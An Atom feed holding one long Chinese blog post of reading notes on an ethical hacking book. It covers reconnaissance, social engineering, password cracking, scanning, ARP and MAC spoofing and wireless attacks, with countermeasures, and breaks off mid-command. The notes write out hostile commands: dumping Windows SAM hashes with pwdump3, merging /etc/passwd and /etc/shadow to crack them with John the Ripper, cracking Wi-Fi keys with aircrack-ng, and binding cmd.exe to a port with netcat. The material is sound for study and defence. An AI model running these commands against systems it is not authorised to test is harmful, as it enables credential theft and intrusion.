<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Demo`s Blog</title>
  
  <subtitle>one world one dream</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="prayer007007.github.io/"/>
  <updated>2018-09-10T15:56:23.075Z</updated>
  <id>prayer007007.github.io/</id>
  
  <author>
    <name>Demo-Mr Wang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>黑客阅读书籍笔记01</title>
    <link href="prayer007007.github.io/2018/09/11/%E9%BB%91%E5%AE%A2%E9%98%85%E8%AF%BB%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B001/"/>
    <id>prayer007007.github.io/2018/09/11/黑客阅读书籍笔记01/</id>
    <published>2018-09-10T23:55:45.000Z</published>
    <updated>2018-09-10T15:56:23.075Z</updated>
    
    <content type="html"><![CDATA[<pre><code>道德黑客攻击（ethical hacking）融合了渗透测试、白帽黑客攻击和漏洞测试1.基础2.攻击：社工攻击和破解3.攻击网络4.攻击操作系统：漏洞扫描5.攻击应用程序：绕过防火墙、入侵监测系统和杀毒软件6.结果7.三个十项</code></pre><a id="more"></a>    <pre><code>惠普    乔·耶格尔Acunetix    罗伯特·艾贝拉AirMagnet    关嘉赐Elcomsoft    弗拉基米尔·卡塔洛夫Karalon        托尼·海伍德GFI Software    维多利亚·马斯卡特·英格罗特Northwest Performance Software 柯克·托马斯Mythicsoft    戴维·维斯特N-Stalker    蒂亚戈·扎尼诺蒂Port80 Software 麦克·安德鲁斯和克里斯·内佩斯TamSoft         迈克尔·伯格Amenaza Technologies    特里·英格尔兹比Identity Finder 艾米特·戈亚尔和弗恩·爱迪生黑客恶意内部用户：指无赖员工、承包商、实习生，或其他滥用其特权的用户道德黑客道德黑客攻击和安全审计：安全审计是将公司的安全策略与实际发生的情况比较，目的 是验证安全控制措施的存在。道德黑客攻击利用漏洞，验证安全控制措施是不到位的。    优先考虑系统，以便将工作重心放在关键事项上；    以非破坏性的方式来攻击系统；    枚举漏洞，如果有必要的话，还要向管理层证明漏洞是存在并可被利用的；    应用结果，以消除漏洞，并更好地保护系统安全。社会工程学：指利用人类信任的天性来获取用于恶意用途的信息。网络基础设施攻击：    通过没有安全措施的无线路由器连接到受防火墙保护的网络；    利用网络协议（TCP/IP和NetBIOS）的弱点进行攻击；    用大量请求占据网络，用合法请求造成拒绝服务（DoS）    在网络中安装网络分析器，捕捉通过网络传输的每个数据包，找出明文传输的机密信息。安全性出色的系统（Novell NetWare和OpenBSD）    利用特定网络协议进行攻击；    攻击内置验证系统；    破坏文件系统安全措施；    破解密码和薄弱加密措施。电子邮件和Web应用程序攻击：    大多数防火墙和其他安全机制都会被配置成允许完全访问这些来自互联网的服务。    IP电话（VoIP）    敏感信息的文件没采取安全措施就散步在工作站和服务器共享，数据库系统中含有很多可被恶意用户利用的漏洞。应用道德黑客攻击流程：    拟定计划        对自己系统进行测试时，授权的形式可以是内部备忘录，也可以是来自老板的电子邮件        信息：        要进行测试的具体系统        所含风险        执行测试的时间和整体时间安排        测试前对待测系统的了解        在发现大漏洞后要采取的行动        具体成果：漏洞扫描的报告，待解决重要漏洞和待实施措施    选择工具        破解密码工具：ophcrack和Proactive Password Auditor        端口扫描程序：SuperScan或Nmap        Web应用评估工具：N-Stalker或WebInspect        网络分析程序：Wireshark    （搜索网站）http://groups.google.com    www.linkedin.com                http://SecurityFocus.com和http://SearchSecurity.com        软件的漏洞扫描器和硬件的网络分析器：        Cain&amp;Abel    OmniPeek    SuperScan    QualysGuard    WebInspect        Proactive Password Auditor    Metasploit    LANguard    AirMagnet WiFi Analyzer    执行计划        被攻击者可以加密：PGP（www.pgp.com）、加密压缩文件或类似技术对含有敏感测试信息的Email加密        （1）在网上搜索组织的名称，计算机和网络系统的名称以及IP地址        （2）缩小范围，将目标对准索要测试的具体系统        （3）进一步缩小。执行实际的扫描和其他测试，发现漏洞        （4）可以执行攻击并利用漏洞（选）    评估结果防范黑客：    黑客做法：        通过每隔几分钟改变自己的MAC地址和IP地址回避入侵防御系统。从而再进一步深入没有被完全封锁的网络        利用物理安全漏洞。再一大早，趁着办公室的百叶窗开着。。。    通过将恶意网站的网址改变成对应的十进制IP地址，并将十进制IP地址转换成Web浏览器中使用的十六进制，从而绕过Web访问控制措施        通过改变未经授权软件默认的TCP端口，使防火墙不会封锁这些软件的使用    在当地的WiFi热点附近设置无线“钓鱼点”，以吸引那些不知情的上网者们连接到流氓网络中，在这个网络中，他们的信息会被截获，而且很容易被操纵。    使用容易相信他人的同事的用户ID和密码，从而获取对敏感信息的访问权，而这种访问权在其他情况下是没法获得的。        拔掉联网闭路电视安全摄像头（用于监控进出机房或其他敏感区域的通道）的电源线或网线，从而自由进出。        为了隐藏身份，通过连接到邻居家未受保护的无线网络，对网站进行SQL注入或密码破解。黑客水平分级：    脚本小子    骇客    安全研究者    黑客行为主义者    网络恐怖分子    寻租黑客（犯罪分子）攻击风格：    放长线钓大鱼    贸然行动    无处不在的恶意用户黑客匿名方式：    从朋友或以前的雇主那里借来的或盗来的拨号和VPN账户；    图书馆、学校或当地商场信息亭中的公用计算机；    开放的无线网络；    因特网代理服务器或匿名服务；    来自于免费Email的匿名或一次性Email账户；    开放的Email中继；    在其他组织中的不安全计算机（也称僵尸或机器人）    受害者网络中的工作站或服务器Camtasia Studio（www.camtasia.com）进行记录屏幕行动攻击方法论：    1.Web搜索：        员工姓名和联系方式；        公司的重大日期；        设立申请；        提交给证券交易委员会的申请；        与行动、组织变化和新产品有关的出版物；        兼并和收购；        专利和商标；        演说、文章和网络广播或网络研讨会。        高级Web搜索        使用交换器深挖网站        site:www.your_domain.com 关键词        site:www.your_domain.com 文件名        filetype:swf company_name        filetype:pdf company_name confidential    2.Web爬虫        例如：HTTrack Website Copier    可以通过下载可公开访问的每个文件制成网站的镜像        网站的排版和配置；        其他情况下不外显或不易于访问的目录和文件；        网页的HTML和脚本源代码；        评论区域。    3.网站        政府和企业网站：        www.hoovers.com和http://finance.yahoo.com提供了与上市公司有关的详细信息        www.sec.gov/edgar.shtml展示了上市公司提交给证券交易委员会的文件；        www.uspto.gov提供了专利和商标注册功能；        背景检查和其他个人信息：        ChoicePoint(www.choicepoint.com);        USSearch(www.ussearch.com)        ZabaSearch(www.zabasearch.com)映射网络    1.Whois    互联网域名注册信息    负责解析大家所在公司域名的DNS服务器    Whois。net（www.whois.net）    域名注册网站    ISP的技术支持网站    （DNSstuff.com）（www.dnsstuff.com）    政府：www.dotgov.gov;    军事：www.nic.mil;    AfriNIC：www.afrinic.net;    APNIC:www.apnic.net;    ARIN:https://ws.arin.net/whois/index.html;    LACNIC:www.lacnic.net/en    RIPE网络协调中心：www.db.ripe.net/whois;    如果不确定道理查询特定国家信息，访问https://www.arin.net/knowledge/rirs/countries.html;    2.Google群组    3.隐私政策扫描系统    主机    ping    让用户可以同时ping多个地址的第三方实用程序。reg:SuperScan(www.foundstone.com/us/resources/proddesc/superscan3.htm),用于Win系统的NetScanTools Pro（www.netscantools.com）,Linux系统fping(www.fping.com)    网站www.whatismyip.com可以显示出现在网上的网关IP地址。    开放的端口    SuperScan或Nmap(http://nmap.org)    OmniPeek(www.wildpackets.com)和Wireshark(www.wireshark.com)    扫描端口获得的信息：        在使用的协议，reg：IP、IPX和NetBIOS        运行在主机上的服务，reg：Email、Web服务器和数据库应用        可用的远程访问服务，reg：Win终端服务、远程桌面、VNC和Secure Shell（SSH）        VPN服务，reg：PPTP、SSL和IPSec        网络共享所需权限        ping（ICMP回声）的应答，允许ICMP流量出入主机；        TCP端口21，表示FTP在运行        23            25、465        53        80、443和8080        135、137、138、139和445    端口了解网站：www.iana.org/assignments/port-numbers    执行端口号查找：www.cotse.com/cgi-bin/port.cgi    检查版本：        输入域名，加上一个不存在的网页        使用Netcraft的What`s that site running?(www.netcraft.com)    深挖：        NMapWin（http://sourceforge.net/projects/nmapwin）可以确定系统的操作系统版本    枚举实用程序（www.systemtools.com/somarsoft/?somarsoft.com上的DumpSec）可以直接从Win提取用户、群组以及文件和共享权限        banner信息：telnet mail.your_domain.com 25        共享查找工具（GFI LANguard中内置的工具）        发送到无效地址的Email可能会返回详细的Email标题信息    评估漏洞：        搜索黑客的留言板、网站和漏洞数据库。        手动评估；        自动评估。        Qualys（www.qualys.com）-&gt;QualysGuardSuite漏洞扫描器渗入系统    了解更多与主机及其数据有关的信息；    获得远程命令提示符；    启动或停止某些服务或应用；    访问其他系统；    禁用日志记录或其他安全控制措施；    捕捉屏幕截图；    访问敏感文件；    以管理员名义发送Email；    执行SQL注入攻击；    启动另一类拒绝服务攻击；    上传文件    （工具：Metasploit）        《开源安全测试方法手册》www.isecom.org/osstmm社会工程学    例子：    假冒的支持人员声称他们需要在用户的计算机上安装补丁或新版软件，说服用户下载软件，获得对系统的远程控制。    假冒的供货商声称需要更新组织的会计包或电话系统，向管理员询问密码，获得全部访问权限。    外部入侵者发送钓鱼Email，收集不知情收件人的用户ID和密码。然后利用密码获利。reg：Web表单上的跨站脚本漏洞攻击。    假冒的员工会告知保安台他们丢失了机房的要钥匙，并从保安那里拿到一串钥匙，进而在未经授权的情况下接触到实体信息和电子信息。    艾拉·温克勒社会工程学的影响    高效的社会工程师会获得：        用户或管理员的密码；        建筑物甚至是机房的安全通行卡或钥匙；        设计规范、配方或其他研发文档之类的知识产权；        机密的财务报表；        私人的和保密的员工信息；        客户名单和销售前景。执行步骤：    （1）进行研究；    （2）简历信任；    （3）利用关系，通过言语、行动或技术套取信息    （4）将收集到的信息用于恶意目的。钓取信息    1.使用互联网    2.翻找垃圾箱（可以查到：）        内部电话名单；        组织图；        员工手册，这里通常会包含安全政策；        网络图；        密码清单；        会议记录；        电子表格和报表；        包含机密信息的电子邮件打印稿。    3.电话系统        住宅电话        企业电话        IP电话服务器，需安装Asterisk（www.asterisk.org）建立信任        可爱性    可信性利用关系    1.通过言行欺骗    2.通过技术欺骗防范社工政策：    分类数据；    聘用员工和承包人，并设定用户ID；    建立器可接受的计算机使用惯例；    删除不再为组织工作的员工、承包人和顾问的用户ID；    设置和重置密码；    响应发现可疑行为之类的安全事件；    处理专有信息和机密信息；    接待访客。物理安全：    建筑大小；    建筑或场所的数目；    员工的数量；    建筑出入口的位置和数量；    数据中心和其他机密信息的位置安排。    测试工程师的总结：（常见的物理安全漏洞）    在办公建筑内没有接待员；    进入建筑不需要访客登记或陪同人员；    只因为访客穿着供应商制服或是自称复印机或计算机维修人员，员工就相信这些访客；    没有门禁系统；    安保闭路电视和数据中心管理系统可以通过带有默认用户ID和密码的网络访问；    门是撑开的；    随意进出的机房；    随处摆放的备份介质；    不安全的计算机硬件（特别是笔记本电脑）和软件介质    垃圾桶中带有机密信息的光盘。建筑结构    1.攻击点    2.对策公共设施    1.攻击点    2.对策办公室布局和使用    1.攻击点    2.对策网络组件和计算机    1.攻击点    2.对策密码密码漏洞：    组织或用户的漏洞    技术漏洞组织漏洞    彩虹表：可以破解几乎任何字母和数字组合的密码。测试是6天破解1845个密码    除非教育和提醒用户使用强密码，否则：        易于猜解        很少更换        在很多地方重复使用        在不安全的地方写下密码。技术漏洞    脆弱的密码加密模式    将密码存储在内存、不安全文件和易访问数据库中的程序    在输入密码时将密码显示在屏幕上的用户应用。破解密码：    旧方法：    1.社工    2.肩窥    3.推理    4.脆弱的认证    新方法：    1.软件：    Cain&amp;Abel(www.oxid.it/cain.html)可以破解LM和NTLM散列，Windows RDP远程，思科IOS和PIX散列，VNC，RADIUS    chknull（www.phreak.org/archives/exploits/novell）会检查没有密码的Novell NetWare账户    Elcomsoft Distributed Password Recovery (www.elcomsoft.com/edpr.html)，破解Office，PGP和PKCS，使GPU加速50倍，与Elcomsoft Wireless Auditor一样。    Elcomsoft System Recovery（www.elcomsoft.com/esr.html）破解Win密码，设置权限    John the Ripper（www.openwall.com/john）破解Linux/UNIX和Win密码的散列    ophcrack（http://ophcrack.sourceforge.net）通过引导光盘使用彩虹表破解Win密码    Pandora（www.nmrc.org/project/pandora）在线或离线破解Novell NetWare密码    Proactive Password Auditor(www.elcomsoft.com/ppa.html)蛮力攻击，字典攻击和彩虹攻击    Proactive System Password Recovery(www.elcomsoft.com/pspr.html)恢复Win密码（各种密码）    pwdump3(www.openwall.com/passwords/dll/pwdump/pwdump3v2.zip)从SAM数据库提取Windows密码散列    RainbowCrack(http://project-rainbowcrack.com)    原理：    密码破解会采用一组已知的密码，并对它们执行密码散列算法。然后生成的加密散列就会飞速与从原始密码数据库中提取出的密码散列进行比较。    密码在存储到计算机上时，通常会使用加密算法或单向散列算法（reg：DES或MD5）加密。散列过的密码就会表示成固定长度的加密字符串，同样的字符串总是表示相同的密码。    Win密码存储位置：    c:\winnt\system32\config SAM    存储在本地或分布在域控制器中的Active Directory数据库文件（ntds.dit），Win有时会存在c:\winnt\repair    一些Win应用程序会将密码存储在注册表或键盘上的明文文件中。    Linux和其他UNIX的变体存放位置：    /etc/password    everyone    /etc/shadow        sys和根账户    /etc/security/passwd     sys和根账户    /.secure/etc/passwd        sys和根账户    2.字典攻击    ftp://ftp.cerias.purdue.edu/pub/dict    ftp://ftp.ox.ac.uk/pub/wordlists    http://packetstormsecurity.nl/Crackers/wordlists    www.outpost9.com/files/WordLists.html    BlcakKnightList(http://rs159.rapidshare.com/files/184075601/BlackKnightList.rar)应该是最全面的    附：可以使用其他语言的文件    3.蛮力攻击    Mask Attack    4.彩虹攻击    破解LM、NTLM、思科PIX和MD5密码散列，成功率接近100%    不能用于破解无限长度的密码散列。    当前支持的LM散列最大长度是14个字符。    http://ophcrack.sourceforge.net购买和下载    存在长度限制的原因是生成这些彩虹表需要花费大量时间。    5.使用pwdump3和John the Ripper    （1）在Win C根目录下创建passwords新目录    （2）下载压缩工具    （3）将软件下载到passwords下，解压安装    pwdump3: www.openwall.com/passwords/dll/pwdump/pwdump3v2.zip    John the Ripper:www.openwall.com/john    (4)将输出重新指向一个名为cracked。txt的文件    c:\passwords\pwdump3 &gt; cracked.txt    该文件存放了John the Ripper破解的Win SAM密码散列    （5）运行John the Ripper来破解Win SAM    c:passwords\john cracked.txt    6.使用John the Ripper破解UNIX密码    需要对/etc/passwd和shadow有root访问权限    (1)www.openwall.com/john下载UNIX版源文件    （2）输入：    [root@localhost kbeaver]# tar -zxf john-1.7.1.tar.gz    (3)进入提取该程序时所创建的/src目录    make generic    (4)进入/run目录，输入命令，使unshadow程序将passwd和shadow文件合并，并复制到cracked.txt中    ./unshadow /etc/passwd /etc/shadow &gt; cracked.txt    (5)破解    ./john cracked.txt    7.使用ophcrack和彩虹表破解Win密码    （1）http://ophcrack.sourceforge.net下载    （2）输入：    ophcrack-win32-installer-3.3.1.exe    (3)加载    （4）“Load”    （5）“Launch”开始彩虹攻击    8.检查NetWare中的空密码或空白密码    使用chknull程序，测试密码为空的、密码与用户名一致的以及密码与在命令行输入的特定密码一致的NetWare用户受密码保护的文件    1.破解    2.对策其他方法：    1.按键记录    SpectorSoft(www.spectorsoft.com)的eBlaster和Spector Pro    Invisible KeyLogger Stealth（www.amecisco.com/iks/htm）    KeyGhost(www.keyghost.com)        对策：1.权限2.商业软件：Fortres 101(www.fortresgrand.com) Deep Freeze(www.faronics.com/html/deepfreeze.asp)    2.脆弱的密码存储    Identity Finder Pro（www.identityfinder.com/pro）    3.网络分析器    Cain&amp;Abel    OmniPeek(www.wildpackets.com/products/distributed_network_analysis/omnipeek_analyzer)    CommView(www.tamos.com/products/commview)    WireShark        对策1.在网络中使用交换机，而不要使用集线器。            2.确保那些不受监管的区域没有使用中的网络连接            3.不要让没有业务需要的人接触到交换机或防火墙公网端的网络连接    4.弱BIOS密码        www.cirt.net/passwords        对策：PGP或全卷加密(Windows BitLocker)    5.被遗忘的弱密码    6.密码重置程序        用Elcomsoft System Recovery将该工具刻录到光盘上，使用该光盘来引导想要恢复密码的系统        若是Win系统，还可以使用NTAccess+ophcrack        Linux系统,使用Knoppix        对策：硬盘加密：Windows BitLocker或PGP Whole Disk Encryption应对破解密码的措施：    存储密码:        PGP        Password Safe    其他策略：        启动安全审计，帮助监控和追踪密码攻击；        测试应用，确保它们没有将密码无限期地存储在内存中或是写入到磁盘中；            WinHex(www.winhex.com/winhex/index-m.html)        及时为系统打补丁；        了解用户ID；            DumpSec        更强的身份验证方法；        自动化的密码重置；        用密码保护BIOS系统保护操作系统安全：    Windows    权限    使用公认的实践（www.cisecurity.org）    SYSKEY    SAM备份安全    15位以上的LM散列    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa创建NoLMHash，键值设为1    使用passfilt.dll、本地安全策略或组安全策略    禁用空会话    Linux和UNIX    shadow处理过的MD5密码    协助防止设定弱密码    检查/etc/passwd文件有没有重复的rootUID项网络基础设施    坎迪斯·莱顿和马歇尔·维伦斯基所著的TCP/IP For Dummies第6版    www.rfc-editor.org/rfcxx00.html    评估时：    防火墙或入侵防御系统这样的设备被置于网络中的什么位置，是怎样配置的。    在外部攻击者执行端口扫描时，他们能看到什么，他们会如何利用网络主机上的漏洞    网络设置，诸如互联网连接、远程访问能力、分层防御的网络中主机的位置    诸如防火墙、入侵防御系统、防病毒设备等已安装安全设备的相互作用    使用哪些协议    未受保护的常受攻击端口    网络主机的配置    网络监控和维护工具-&gt;扫描器、分析器和漏洞评估工具    扫描器和分析器    SuperScan用于ping扫描和端口扫描    Essential NetTools有多种多样的网络扫描功能    NetScanTools Pro包括ping扫描、端口扫描和SMTP中继测试    Getif可用于SNMP（网络管理协议）枚举    Nmap，NMapWin用于主机端口探测和操作系统特征分析    Cain&amp;Abel用于网络分析和ARP攻击    WildPackets的OmniPeek可用于网络分析    漏洞评估    GFI LANguard用于端口扫描和漏洞测试    Nessus具有ping扫描，端口扫描和漏洞测试功能    QualysGuard用于深度漏洞测试    扫描、扰动和刺探    （1）收集信息并映射网络    （2）扫描系统柯克哪些系统是可用的    （3）确定发现了系统上运行的东西    （4）渗入所发现的系统（选）    端口扫描器    7,19,20，21,22,23,25,37,53,69,79,80,110,111,135,137、138、139、445,161,443,512、513、514,1433,1434,1723,3389,5631、5631,8080    1.ping扫描    2.使用端口扫描工具    SuperScan    Nmap：        连接：查找TCP端口，确定入侵检测系统(IDS)、入侵防御系统(IPS)、防火墙或其他日志记录设备有没有记录这些连接        UDP扫描        SYN秘密扫描：与主机建立半开的TCP连接，躲避IDS系统和日志记录。    FIN秘密扫描、圣诞树扫描和Null扫描：这些扫描会改变每个TCP数据包头部的标志位，让用户可以测试主机处理这些数据包的方式，从而找出薄弱的TCP/IP实现以及要打的补丁。    NetScanTools Pro        收集一般性的网络信息，reg：独立IP地址的数量、NetBIOS名称和MAC地址    3.防御ping扫描和端口扫描的对策        只启用访问内部主机所需的通信，并拒绝一切其他通信。这适用于标准端口，可以应用到：            用于入站通信的外部路由器            用于出站通信的防火墙        对防火墙进行配置，逐渐查找潜在的恶意行为（reg：在一段特定时间内接收到的数据包的数量），如果达到某个特定阈值，reg：1分钟内出现10次端口扫描，或者是出现100次连续ping请求。    SNMP扫描        1.漏洞        被攻破之后就可以收集reg：ARP表，用户名和TCP连接之类的网络信息        商业工具NetScanTools Pro和Essential NetTools        基于图形用户界面的免费Windows软件Getif        基于文本的免费Windows软件SNMPUTIL        2.防御SNMP攻击的对策        如果不使用SNMP，总是在主机上禁用SNMP        在网络边界阻断SNMP端口（UDP端口161和162）        将SNMP community读字符串默认的public和community写字符串默认的private改为几乎不会被猜解的长而复杂的值    banner获取        banner是透露网络主机的软件版本号和其他系统信息的欢迎屏幕。        1.telnet        telnet ip_address        连接其他端口：        SMTP: telnet ip_address 25        HTTP: telnet ip_address 80        POP3: telnet ip_address 110        2.防御banner获取攻击的对策            如果使用会提供banner信息的某些服务并非业务需求，就请在网络主机上禁用这些无用的服务。    如果默认的banner不是业务需要，或者如果可以定制banner，那么通过配置网络主机的应用程序或操作系统禁用banner，或者是一处banner中可能被攻击者利用的信息。请根据具体的厂商来查询与如何完成这些工作有关的信息。    防火墙规则        一些扫描工具可以测试开放端口，并确定流量是否真正被允许穿过防火墙        1.测试        Netcat    可以在不用直接测试生产系统的前提下测试特定的防火墙规则。reg：我们可以检查防火墙是否允许端口23通过，按以下操作：        （1）在网络内部的客户机上加载Netcat        这一步会建立出站连接        （2）在防火墙外的测试机上加载Netcat        这是让测试从外向内进行        （3）在客户机上输入Netcat的监听器命令，并输入要测试的端口号        nc -l -p 23 cmd.exe        (4)输入Netcat命令，在测试机上启动入站会话。必须有：            待测内部机的IP地址            要测试的端口号        reg：如果内部机的IP地址是10.11.12.2，端口号是23，就输入：        nc -v 10.11.12.2 23        如果Netcat在外部机上打开了新的命令提示符，就说明已经连接上内部机，并能执行内部机上的命令了。        Traffic IQ Pro            用户可以将第一块网卡NIC连接到防火墙的内部网段中，将第二块网卡连接到防火墙外部网段或隔离区（DMZ）        Firewalk            会发送生存时间（TTL）递增1的TCP和UDP数据包，并根据响应情况确定数据包是否通过了可用的端口        2.防御防火墙规则库漏洞的对策            严格限制流量            阻止ICMP，以帮助防止外部攻击者通过扰动和刺探网络查看那些主机处于活动状态。            如果可以的话，启用防火墙上的状态数据包检测功能。这可以阻止某些请求。    网络分析器        也称为嗅探器。        适合用于从线路中嗅探出数据包，是运行在计算机上，与网卡协同工作的软件，会将网卡设置成混杂模式。        功能：            捕获所有的网络流量；            将找到的信息解读或解码成可供人们阅读的格式；            按照时间顺序显示内容            查看异常的网络流量，甚至可以跟踪入侵者；            在安全事故发生之前为网络活动和网络性能设置一个基准            //跟踪和隔离恶意的网络使用情况；            //检测恶意木马程序；            //监控和跟踪拒绝服务攻击        1.网络分析器程序        WildPackets的OmniPeek        Tamosoft的CommView        Cain&amp;Abel        Wireshark        ettercap        要捕获所有流量，就必须将分析器连接到以下位置：            网路中的集线器；            交换机上的监控/SPAN/镜像端口；            进行过ARP攻击的交换机。        如果想要看看与基于网络的IDS所看到的类似的流量，就应该将网络分析器连接到防火墙外侧的集线器或交换机监控端口上：            在防火墙过滤器消除垃圾流量之前会有什么进入网络；            在流量经过防火墙之后还有什么会留在网络中。        要了解的问题：            怪异的流量：                数量异常的ICMP数据包                过量的多播或广播流量                不属于特定环境的数据包类型            互联网使用习惯：                上网；                电子邮件；                即时消息和其他P2P软件            有疑问的使用：                很多数据包丢失或者过大，表明出现了黑客工具或恶意软件；                很高的带宽占用率，可能说明出现了不该出现的Web或FTP服务器。            端口扫描器和漏洞评估工具机型的侦查性探测和系统分析：                比如来自未知主机的大量入站流量，尤其是通过不常用端口流入的            进行中的黑客攻击                比如海量的入站UDP或ICMP echo请求、SYN洪流或过量的广播            网络中出现非标准的主机名            那些可能吃掉网络带宽、提供非法软件或访问网络主机的隐藏服务器            对特定应用程序进行的攻击                reg：出现诸如/bin/rm、/bin/ls、echo和cmd.exe这样的命令，出现SQL查询和Javascript注入。            如果网络分析器支持的话，请将网络分析器设置为使用先进先出（FIFO）的缓冲区            如果网络分析器支持的话，请将所有捕获的流量记录到一个文件中，并将其存储在硬盘上。            当网络流量从网络分析器中看起来不正常时，实际情况可能并非如此。            CommView            NetResident        2.应对网络协议漏洞的策略            物理安全            网络分析器的探测                Sniffdet,用于UNIX系统                PromiscDetect，用于Windows系统                可以让用户监控网络中是否有处于混杂模式的以太网卡对MAC的攻击    1.ARP欺骗（Address Resolution Protocol，地址解析协议）        ARP表：即那些存储着IP地址到MAC（media access control,媒体访问控制）地址的映射的表。        改变此表可以使其将数据包发到攻击者电脑，ARP欺骗是用于MITM(man-in-the-middle,中间人)攻击的        伪造的ARP应答可以被发送到交换机，让交换机回到广播模式，从而在实质上将其变为集线器。        reg：攻击者Hacky    两个合法网络用户（Joe和Bob）        (1)Hacky使用dsniff、ettercap或他自己编写的实用程序对受害者Joe和Bob机器上的ARP缓存进行欺骗        (2)Joe将Hacky的MAC地址与Bob的IP地址关联起来        (3)Bob将Hacky的MAC地址与Joe的IP地址关联起来        (4)Joe的通信数据和Bob的通信数据都会首先被发送到Hacky的IP地址        (5)Hacky的网络分析器会捕获Joe和Bob的通信数据    2.使用Cain&amp;Abel进行ARP攻击        1-12步    3.MAC地址欺骗        基于UNIX系统：        (1)禁用网络接口        # ifconfig eth0 down        (2)为想要的MAC地址输入命令        # ifconfig eth0 hw ether new_mac_address        Linux可以使用GNU MAC Changer        基于Windows：        cmd-&gt;regedit.exe        (1)加载        (2)选择MAC        (3)在“New Spoofed MAC Address”(伪造的新MAC地址)，-&gt;&quot;Update MAC&quot;        (4)&quot;Network and Dialup Connections&quot;(网络和拨号连接)中右击网卡，选择“Disable”(禁用)           再次右击，“Enable”           重启电脑        (5)点击SMAC界面的“Refresh”            选择需要更改MAC地址的适配器            点击“Remove MAC”            重复（4）步骤            点击SMAC界面中的”Refresh“    4.防御ARP攻击和MAC地址欺骗攻击的对策        阻止.            如果交换机可启用端口安全功能防止MAC地址表的自动改变，那么就可以阻止MAC地址欺骗        检测            可以通过IDS、IPS，或是独立的MAC地址监控工具检测者两类黑客攻击。            Arpwatch拒绝服务（DoS）    1.拒绝服务攻击        SYN洪水攻击：攻击者会用大量TCP SYN数据包淹没主机        死亡之ping：攻击者会发送超过最大长度65535字节的IP数据包，从而最终将很多操作系统的TCP/IP栈弄崩溃        WinNuke：这种攻击可以在较老的Windows95和WindowsNT计算机上禁用联网功能        分布式拒绝服务攻击（Distributed DoS,DDoS）    2.测试        QualysGuard和WebInspect        UDPFlood        Blast        NetScanTools和CommView    3.防御拒绝服务攻击的对策        尽快地测试安全补丁（包括服务包和固件更新）并未网络主机（如路由器和防火墙）以及服务器和工作站的操作系统应用这些补丁        使用IDS或IPS定期监控拒绝服务攻击        将防火墙和路由器配置成阻止恶意流量。        将IP欺骗的概率降到最低。这需要过滤多个地址的外部数据包        阻止所有的ICMP入站流量进入网络。        禁用所有不需要的TCP/UDP小服务，如echo和chargen路由器、交换机和防火墙的常见弱点    不安全的接口    IKE（Internet Key Exchange,因特网网密匙交换）弱点一般性网络防御措施    （打字打累了。。。。百度吧）无线局域网（WLAN，也叫做Wi-Fi）    基于IEEE 802.11标准    Windows评估无线网络的工具：    NetStumbler    AirMagnet WiFi Analyzer    WildPackets的OmniPeek    Elcomsoft Wireless Security Auditor    aircrack    还需要合适的硬件。Orinoco 802.11b PC卡的组合。能与NetStumbler兼容，还能外接天线。    芯片组了解信息：The Seattle Wireless Hardware Comparison(西雅图无线硬件对比)    手持式无线安全测试设备，reg：Canary Wireless公司好用的数字热点追踪器（Digital Hotspotter）以及AirMagnet Handheld Analyzer。    无线天线分类：        全方位天线        半定向天线        定向天线    www.cantenna.comSuper Cantenna套件    http://mywebpages.comcast.net/hughpep发现无线局域网    检查是否已被识别        arp-a来确定MAC地址        www.wigle.net        www.wifimaps.com        www.wifinder.com    扫描本地点波        寻找SSID（service set identifier,服务集标识符）        NetStumbler可以发现：            MAC地址；            名称；            使用中的无线电信道；            供应商名称；            是否启用了加密；            射频信号强度    测试蓝牙认证/配对和数据传输弱点的资源和工具        Car Whisperer(http://trifinite.org/trifinite_stuff_carwhisperer.html)        Blooover(http://trifinite.org/trifinite_stuff_blooover.html)        BlueScanner(https://labs.arubanetworks.com)        Bluesnarfer(www.alighieri.org/tools/bluesnarfer.tar.gz)        蓝牙狙击枪(http://www.tomsguide.com/us/how-to-bluesniper-pt1,review-408.html)        Bluejacking社区网站(www.bluejackq.com)        Windows XP版BTScanner(www.pentest.co.uk/src/btscanner_1_0_0.zip)        Smurf(www.gatefold.co.uk/smurf)        各种蓝牙攻击的详细展示(http://trifinite.org/Downloads/21c3_Bluetooth_Hacking.pdf)    加密流量        802.11的加密协议        有限等效保密（Wired Equivalent Privacy，WEP）：使用了对称(共享秘钥)加密算法RC4        Wi-Fi保护访问（Wi-Fi Protected Access，WPA）        使用WEPCrack，AirSnort，aircrack(http://aircrack-ng.org)破解        下载并提取aircrack程序集，cygwin Linux模拟环境，以及支持PEEK文件        WEP的静态秘钥调度算法，使秘钥长度每增加1位，破解就需要增加20000个左右。        破解预共享秘钥：        # aircrack-ng -a2 -w path_to_wordlist &lt;capture file(s)&gt;        EWSA,只要以tcpdump格式捕获无线数据包，讲捕获文件载入该程序，就可以破解了。前提是要有支持NVIDIA或ATI显卡的计算机。防御加密流量攻击的对策    解决WEP问题最简单的办法就是为所有的无线通信使用WPA，WPA2.也可以通过为客户端通信启用点对点隧道协议（PPTP），在Windows环境下使用VPN来解决这一问题。    还可以使用Windows内置的IPSec支持、Secure Shell(SSH)、安全套接层/传输层安全(Secure Sockets Layer/Transport Layer Security,SSL/TLS)，来保证网络流量的安全。流氓无线设备    流浪接入点一般具有下列特征：        奇怪的SSID，包括常见的默认名称linksys和wifi        奇怪的接入点系统名称--如果硬件支持该功能的话，就是指接入点的名称。别将其与SSID弄混了        不属于自己网络的MAC地址。看MAC地址的前三个字节，这是表明厂商名称的。可以在网上查询MAC地址对应的厂商        弱无线信号，这可能表明接入点在隐藏自身或是接入点处于组织所在的建筑之外。        出现在不是自身网络通信所用无线信道上的通信。        无线局域网客户端网络吞吐量的下降。        攻陷方法：《Hacking Wireless Networks For Dummies》        可以使用手持式数字热点追踪器(Digital Hotspotter)，搜索ESS字段不为1的信标数据包。防御流氓无线设备的对策MAC欺骗    将接入点配置成只允许具备已知MAC地址的无线客户端连接道网络。    测试MAC地址控制的步骤：    （1）找到可供连接的接入点    （2）使用无线局域网分析器，查找向广播地址发送探测请求数据包的无线客户端，或是以探测响应进行回复的接入点    （3）将测试机的MAC地址改为步骤2所发现无线客户端的MAC地址。        a)登录道具有root权限的账户，然后禁用网络接口。        # ifconfig wlan0 down        b)输入想要使用的新MAC地址        # ifconfig wlan0 hw ether 01:23:45:67:89:ab        # ip 